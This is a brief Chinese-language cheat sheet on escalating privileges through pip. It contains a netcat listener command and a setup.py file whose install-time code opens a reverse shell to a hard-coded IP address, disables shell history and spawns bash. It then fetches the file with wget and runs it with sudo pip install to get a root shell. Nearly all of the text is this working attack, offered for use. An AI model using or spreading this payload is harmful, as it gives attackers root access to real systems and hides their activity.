# pip提权

```bash
本地监听
nc -tvlp 9900
-------------------------setup.py-------------------------
from setuptools import setup   #加入

def con():
	import socket, time,pty, os
	host='192.168.247.129'
	port=9900
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
	s.connect((host,port))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	os.putenv("HISTFILE",'/dev/null')
	pty.spawn("/bin/bash")
	s.close()
con()

setup(name="hahahaha", version="1.0")  #加入
--------------------------------------------------------------
上传
wget http://10.211.55.19:8081/setup.py
sudo /usr/bin/pip install . --upgrade --force-reinstall
```

‍
